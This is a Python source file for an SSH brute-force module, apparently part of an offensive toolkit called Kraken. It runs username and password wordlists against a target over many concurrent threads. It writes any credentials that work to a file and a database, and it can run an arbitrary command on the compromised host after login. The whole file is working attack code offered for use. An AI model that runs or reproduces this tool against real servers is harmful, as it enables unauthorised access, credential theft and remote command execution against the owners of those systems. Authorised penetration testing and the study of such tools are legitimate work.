import os
import sys
import socket
import logging
from typing import List, Optional, Any
import paramiko
from colorama import Fore, Style
import gevent
from gevent import monkey
from gevent.pool import Pool

monkey.patch_all()

from core.module import KrakenModule
from core.ui import success, error, info
from core.logger import setup_logger

logger = setup_logger(os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'Logs', 'ssh_brute_force.log'))
logging.getLogger("paramiko.transport").setLevel(logging.CRITICAL)

class SSHBruteForce(KrakenModule):
    def __init__(self):
        super().__init__(name="SSH", default_port=22)
        self.result_file_path = os.path.join(self.results_dir, "ssh_results.txt")

    def check_target(self, target: str, port: Optional[int] = None) -> bool:
        port = port or self.default_port
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(5)
                return sock.connect_ex((target, port)) == 0
        except socket.gaierror as e:
            logger.error(f"Network error: {e}")
            return False

    def attempt_login(self, ip: str, username: str, password: str, port: int, cmd: str, progress: Any, task_id: Any) -> Optional[str]:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(hostname=ip, username=username, password=password, port=port, timeout=5)
            
            # Successful Login
            success_msg = f"{username}:{password}"
            progress.console.print(f"[bold green][+] SUCCESS: {success_msg}[/bold green]")
            logger.info(f"Success: {success_msg} @ {ip}")
            with open(self.result_file_path, "a") as result_file:
                result_file.write(f"{ip} -> {success_msg}\n")
            
            try:
                sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), '..'))
                from api.save_hit import save_to_db
                save_to_db("SSH", ip, username, password)
            except Exception as e:
                logger.debug(f"DB Save ignored: {e}")
            
            if cmd:
                stdin, stdout, stderr = client.exec_command(cmd, get_pty=True)
                output = stdout.read().decode().strip()
                progress.console.print(f"[cyan]Command output: {output}[/cyan]")

            return success_msg
        except Exception as e:
            logger.debug(f"Login failed for {username}:{password} @ {ip}: {e}")
            return None
        finally:
            client.close()
            progress.update(task_id, advance=1, current_attempt=f"{username}:{password}")

    def execute_brute(self, ip: str, usernames: List[str], passwords: List[str], port: int, cmd: str, threads: int) -> None:
        total_attempts = len(usernames) * len(passwords)
        pool = Pool(threads)

        with self.create_progress_bar() as progress:
            task_id = progress.add_task("[cyan]Brute Forcing...", total=total_attempts, current_attempt="Initializing...")
            
            def handle_result(username: str, password: str) -> None:
                self.attempt_login(ip, username, password, port, cmd, progress, task_id)

            try:
                for username in usernames:
                    for password in passwords:
                        pool.spawn(handle_result, username, password)
                pool.join()
            except KeyboardInterrupt:
                progress.stop()
                progress.console.print("[bold yellow]\n[!] Script interrupted by user. Shutting down threads...[/bold yellow]")
                os._exit(0)

        logger.info("Brute force process completed.")

    def run(self, target: str, port: int, users_file: Optional[str], username: Optional[str], passwords_file: str, cmd: str, threads: int) -> None:
        self.setup_ui()

        if not self.check_target(target, port):
            error(f'SSH port {port} is not open on {target}. Check the target IP or server status.')
            sys.exit(1)

        usernames = []
        if users_file:
            usernames = self._get_wordlist(users_file, "users.txt", "path to username list", is_user=True)
            if not usernames:
                error(f'User list {users_file} is empty or missing.')
                sys.exit(1)
        elif username:
            usernames = [username]
        else:
            error('You must specify either a users list or a single username.')
            sys.exit(1)
        
        passwords = self._get_wordlist(passwords_file, "passwords.txt", "path to password list")
        self.execute_brute(target, usernames, passwords, port, cmd, threads)

    def run_interactive(self) -> None:
        self.setup_ui()
        print(Style.BRIGHT + Fore.YELLOW + "Input Configuration" + Style.RESET_ALL)
        
        target_ip = input(Fore.WHITE + "Enter the SSH server IP address: ").strip()
        port = int(input(Fore.WHITE + "Enter the port of the SSH server (default: 22): ") or 22)

        if self.check_target(target_ip, port):
            use_list = input(Fore.WHITE + "Use a username list? (Y/n): ").strip().upper() != 'N'
            if use_list:
                users = self._get_wordlist(None, "users.txt", "Enter path to username list", is_user=True)
                if not users:
                    error("Error: The username list is empty or could not be found.")
                    sys.exit(1)
            else:
                users = [input(Fore.WHITE + 'Enter single username: ').strip()]

            pwds = self._get_wordlist(None, "passwords.txt", "Enter path to password list")
            cmd = input(Fore.WHITE + "Enter the command to execute upon successful authentication (optional): ").strip()
            threads = int(input(Fore.WHITE + "Enter number of threads to use (default: 40): ") or 40)
            
            info("\n" + "="*80 + "\n")
            self.execute_brute(target_ip, users, pwds, port, cmd, threads)
        else:
            error(f'SSH port {port} is not open on {target_ip}. Check the target IP or server status.')
            sys.exit(1)

# Preserve compatibility if external scripts import/call this directly.
_module = SSHBruteForce()

def run(*args, **kwargs):
    _module.run(*args, **kwargs)

def run_interactive():
    _module.run_interactive()

if __name__ == "__main__":
    try:
        run_interactive()
    except KeyboardInterrupt:
        logger.info("Script interrupted by user.")
        print(Fore.YELLOW + "\nScript interrupted by user.")
